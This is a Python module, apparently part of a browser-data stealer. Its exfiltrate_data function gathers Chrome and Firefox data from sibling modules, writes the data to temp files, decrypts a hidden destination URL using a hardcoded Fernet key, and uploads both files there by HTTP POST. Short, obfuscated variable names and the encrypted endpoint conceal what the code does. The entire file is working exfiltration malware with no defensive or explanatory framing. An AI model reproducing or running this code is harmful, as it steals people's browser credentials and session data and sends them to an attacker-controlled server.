B = open
from .Cadmino import main
from .Fadmino import f_main
from cryptography.fernet import Fernet as aio
import tempfile as Q, requests as E, json as F, os

R = "gAAAAABmEi6IMsOG7am-kCT2D3ZUBp__HoQlLHUbzsHsZnvfQ4eEwZKbtYZnvLZasGPp7mBh-GgJvs85cSz2qjf3qDiEVZ680AYK_GAD7-iMPwZYu86zmAd9JlThMvQkguHj40txpMtkEXHMOGHtpHF6OXx_xV_kxnQ4kcAumjdgTRmLG45xtcs42H3TOWEq5IIWbH_ZEL1VMrQhaxyZvmrx9KbNFfZ0WBRP46xhbuCScvJrxDvxIG4="


def exfiltrate_data():
    N = "file"
    M = "payload_json"
    L = "BOOT_URL"
    D = None
    try:
        G = main()
    except:
        G = []
    try:
        H = f_main()
    except:
        H = []
    I = Q.mkdtemp(prefix="pre_", suffix="_suf")
    J = f"{I}\\F.txt"
    K = f"{I}\\C.txt"
    with B(J, "w") as S:
        S.write(F.dumps(H))
    with B(K, "w") as T:
        T.write(F.dumps(G))
    if os.getenv(L) is D:
        A = R
        U = aio("zfW7TU0Gc8JhJW2TWZ_RYa6Dy7ysMpsqKghWypHpERw=")
        A = U.decrypt(A).decode()
    else:
        A = os.getenv(L)
    C = {M: (D, '{"content": "Firefox"}'), N: B(J, "rb")}
    E.post(A, files=C)
    C = {M: (D, '{"content": "Chrome"}'), N: B(K, "rb")}
    E.post(A, files=C)
